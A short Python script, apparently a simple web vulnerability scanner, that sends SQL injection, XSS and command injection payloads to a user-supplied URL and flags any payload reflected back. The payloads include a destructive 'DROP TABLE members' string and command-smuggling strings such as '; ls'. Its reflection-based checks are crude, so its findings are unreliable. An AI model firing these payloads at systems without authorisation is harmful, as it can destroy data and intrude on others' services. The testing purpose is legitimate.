import requests
import urllib.parse

class VulnerabilityScanner:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()

    def test_sql_injection(self):
        # Add your advanced SQL Injection payloads here
        sql_payloads = ["' OR '1'='1'", "' OR '1'='2'", "' OR 'a'='a'", '" OR "a"="a"', "' OR 'x'='x'; --", "' OR 1=1; --", "' OR 'x'='x'; DROP TABLE members; --", "' OR 'x'='x'; SELECT * FROM members; --"]
        return self.inject_payloads(sql_payloads, "SQL Injection")

    def test_xss(self):
        # Add your advanced XSS payloads here
        xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>", "<svg/onload=alert(1)>", "<body onload=alert('XSS')>"]
        return self.inject_payloads(xss_payloads, "XSS")

    def test_command_injection(self):
        # Add your Command Injection payloads here
        cmd_payloads = ["; ls", "| ls", "`ls`", "|| ls", "&& ls"]
        return self.inject_payloads(cmd_payloads, "Command Injection")

    def inject_payloads(self, payloads, vulnerability):
        for payload in payloads:
            if self.send_request(payload):
                print(f"Potential {vulnerability} detected at {self.url}")

    def send_request(self, payload):
        try:
            response = self.session.get(self.url + urllib.parse.quote(payload))
            return payload in response.text
        except Exception as e:
            print(f"Error occurred: {e}")
            return False

if __name__ == "__main__":
    url = input("Enter the URL to scan: ")
    scanner = VulnerabilityScanner(url)
    scanner.test_sql_injection()
    scanner.test_xss()
    scanner.test_command_injection()
